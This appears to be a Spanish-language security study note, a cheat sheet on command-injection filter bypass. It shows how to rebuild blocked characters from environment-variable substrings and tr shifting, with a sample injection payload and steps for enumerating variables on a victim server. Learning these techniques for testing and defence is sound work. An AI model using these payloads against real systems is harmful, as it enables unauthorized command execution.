---
aliases: null
tags:
  - type/technique
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[OS Command Injection]]'
---
# Command Injection - Generación de Caracteres Bloqueados

***

## Cheatsheet

|      **Entorno**      |        **Técnica**         |            **Sintaxis / Payload**             |                                         **Descripción**                                          |
|:---------------------:|:--------------------------:|:---------------------------------------------:|:------------------------------------------------------------------------------------------------:|
| <br>**Linux (Bash)**  |   <br>**Bypass (Slash)**   |      <pre><code>${PATH:0:1}</code></pre>      |          <br>Extrae el carácter `/` que suele estar al inicio de la variable `$PATH` .           |
|     <br>**Linux**     | <br>**Bypass (Semicolon)** |   <pre><code>${LS_COLORS:10:1}</code></pre>   |             <br>Genera un punto y coma `;`. Útil para encadenar comandos inyectados.             |
|     <br>**Linux**     | <br>**Bypass (Shifting)**  | <pre><code>$(tr '!-}' '"-~'<<<[)</code></pre> |       <br>Genera una barra invertida `\`. Desplaza el carácter `[` (+1 ASCII) usando `tr`.       |
| <br>**Windows (CMD)** | <br>**Variable Substring** |   <pre><code>%HOMEPATH:~6,-11%</code></pre>   | <br>Extrae `\` usando offsets. Inicio positivo (6) y fin negativo (-11) para recortar la cadena. |
| <br>**Windows (PS)**  |   <br>**Array Indexing**   |   <pre><code>$env:HOMEPATH[0]</code></pre>    |     <br>PowerShell trata las cadenas como arrays. Extrae el carácter en la posición 0 (`\`).     |
|   <br>**Discovery**   |  <br>**Listar Variables**  |       <pre><code>printenv</code></pre>        | <br>**Linux**: Muestra todas las variables de entorno disponibles para buscar caracteres útiles. |
|   <br>**Discovery**   |  <br>**Listar Variables**  |  <pre><code>Get-ChildItem Env:</code></pre>   |  <br>**Windows (PS)**: Muestra las variables de entorno para encontrar caracteres a reutilizar.  |
^ci-caracteres-bloqueados

---

## Explicación de Técnicas

### 1. Manipulación de Variables de Entorno (Linux & Windows)

El objetivo es utilizar caracteres que ya existen dentro de las variables del sistema (`$PATH`, `$HOME`, etc.) para construir nuestro comando sin escribir el carácter prohibido explícitamente.

- **Linux (Bash):** La sintaxis es `${VARIABLE:inicio:largo}`.
    - Ejemplo para inyección: Si `127.0.0.1; ls` está bloqueado por el `;`, podemos usar `127.0.0.1${LS_COLORS:10:1}${IFS}ls`.
- **Windows (CMD):** La sintaxis es `%VARIABLE:~inicio,fin%`.
    - Si el final es negativo, cuenta desde atrás hacia adelante.

### 2. Character Shifting (Desplazamiento de Caracteres)

Si no encontramos el carácter en una variable, podemos generarlo matemáticamente usando la tabla ASCII y el comando `tr` (translate).

1. Busca el carácter que necesitas en `man ascii`.
2. Busca el carácter **anterior** en la tabla.
3. Usa `tr` para cambiar el rango de caracteres +1.

**Ejemplo para conseguir `\` (barra invertida):**
- En ASCII, `\` es el 92.
- El anterior es `[` (91).
- Comando: `echo $(tr '!-}' '"-~'<<<[)` -> Resultado: `\`

### 3. Enumeración para el Bypass

Antes de lanzar el payload, es vital saber qué variables están disponibles en el servidor víctima.
- **Paso 1:** Ejecuta `printenv` (Linux) o `set` / `Get-ChildItem Env:` (Windows).
- **Paso 2:** Copia el output a tu editor de texto.
- **Paso 3:** Busca visualmente dónde se encuentra el carácter que te están bloqueando (ej. un `:` o un `/`).
- **Paso 4:** Cuenta la posición (índice) y construye tu payload de extracción.


***

## Overview


***

## Notas Relacionadas


***
